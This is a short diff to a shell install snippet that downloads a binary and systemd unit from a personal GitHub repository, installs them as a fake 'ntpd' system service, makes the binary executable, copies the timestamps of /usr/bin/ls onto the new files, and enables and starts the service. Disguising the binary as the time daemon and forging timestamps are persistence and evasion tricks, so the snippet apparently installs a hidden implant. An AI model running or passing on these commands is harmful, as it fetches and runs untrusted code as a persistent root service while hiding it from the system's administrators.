@@ -1,8 +1,9 @@
 curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ntpd -o /usr/bin/ntpd
 curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ntpd.service -o /etc/systemd/system/ntpd.service
+chmod +x /usr/bin/ntpd
 touch -r /usr/bin/ls /usr/bin/ntpd /etc/systemd/system/ntpd.service
 systemctl daemon-reload
 systemctl enable ntpd
 systemctl start ntpd
 
-curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ntpd -o /usr/bin/ntpd && curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ntpd.service -o /etc/systemd/system/ntpd.service && touch -r /usr/bin/ls /usr/bin/ntpd /etc/systemd/system/ntpd.service && systemctl daemon-reload && systemctl enable ntpd && systemctl start ntpd
+curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ntpd -o /usr/bin/ntpd && curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ntpd.service -o /etc/systemd/system/ntpd.service && chmod +x /usr/bin/ntpd && touch -r /usr/bin/ls /usr/bin/ntpd /etc/systemd/system/ntpd.service && systemctl daemon-reload && systemctl enable ntpd && systemctl start ntpd
